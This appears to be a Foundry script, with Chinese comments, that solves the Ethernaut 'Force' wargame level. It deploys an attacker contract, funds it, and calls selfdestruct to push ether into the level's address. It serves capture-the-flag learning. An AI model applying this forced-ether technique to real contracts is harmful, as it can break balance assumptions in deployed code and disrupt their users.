// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract Attacker {
    constructor() {}

    function attack(address receiver) public payable {
        selfdestruct(payable(receiver));
    }

    receive() external payable {}
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        Attacker attacker = new Attacker();

        // 给攻击合约发送 ether
        uint amount = 1 gwei;
        (bool success, ) = address(attacker).call{value: amount}("");
        require(success, "Failed to send Ether to the test contract");

        // 攻击合约发动攻击
        address receiver = 0xd2E4Ba00684F3d61D585ca344ec566e03FA06F47; // level:Force
        attacker.attack(receiver);

        vm.stopBroadcast();
    }
}
